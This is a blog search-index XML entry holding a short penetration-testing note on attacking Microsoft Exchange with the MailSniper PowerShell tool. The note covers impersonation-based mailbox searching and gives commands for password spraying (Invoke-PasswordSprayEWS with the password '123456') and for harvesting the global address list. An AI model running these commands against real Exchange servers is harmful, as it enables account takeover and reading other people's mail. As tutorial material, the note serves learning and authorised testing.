<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>attacking-exchange-with-mailsniper</title>
      <link href="/2018/08/27/attacking-exchange-with-mailsniper/"/>
      <url>/2018/08/27/attacking-exchange-with-mailsniper/</url>
      <content type="html"><![CDATA[<h1 id="attacking-exchange"><a href="#attacking-exchange" class="headerlink" title="attacking-exchange"></a>attacking-exchange</h1><p>This module will connect to a Microsoft Exchange server and grant the “ApplicationImpersonation” role to a specified user. Having the “ApplicationImpersonation” role allows that user to search through other domain user’s mailboxes. After this role has been granted the Invoke-GlobalMailSearch function creates a list of all mailboxes in the Exchange database. The module then connects to Exchange Web Services using the impersonation role to gather a number of emails from each mailbox, and ultimately searches through them for specific terms.</p><h2 id="load-import-moudle"><a href="#load-import-moudle" class="headerlink" title="load import moudle"></a>load import moudle</h2><p>load powershell script <a href="https://github.com/Labs22/BlackServerOS/blob/14271336a377e567e9c1ee00950b002c73749c84/information-gathering/MailSniper-master/MailSniper-master/MailSniper.ps1" target="_blank" rel="noopener">https://github.com/Labs22/BlackServerOS/blob/14271336a377e567e9c1ee00950b002c73749c84/information-gathering/MailSniper-master/MailSniper-master/MailSniper.ps1</a></p><p><img src="http://ow7nq66xr.bkt.clouddn.com/15137881549641.jpg" alt=""></p><h2 id="Get-user-password"><a href="#Get-user-password" class="headerlink" title="Get user/password"></a>Get user/password</h2><p><img src="http://ow7nq66xr.bkt.clouddn.com/15258822732796.jpg" alt=""></p><p><img src="http://ow7nq66xr.bkt.clouddn.com/15258823729155.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Invoke-PasswordSprayEWS -ExchHostname test.com.cn -UserList .\1.txt -Password 123456 -Threads 15 -OutFile e</span><br><span class="line">ws-sprayed-creds1.txt</span><br></pre></td></tr></table></figure><h2 id="Get-system-users"><a href="#Get-system-users" class="headerlink" title="Get system users"></a>Get system users</h2><p><img src="http://ow7nq66xr.bkt.clouddn.com/15258824325200.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-GlobalAddressList -ExchHostname test.com.cn -UserName anquanceshi -Password 123456 -OutFile global-addr</span><br><span class="line">ess-list1.txt</span><br></pre></td></tr></table></figure><p>Reference</p><p><a href="https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/</a></p>]]></content>
      
      
    </entry>
    
  
  
</search>
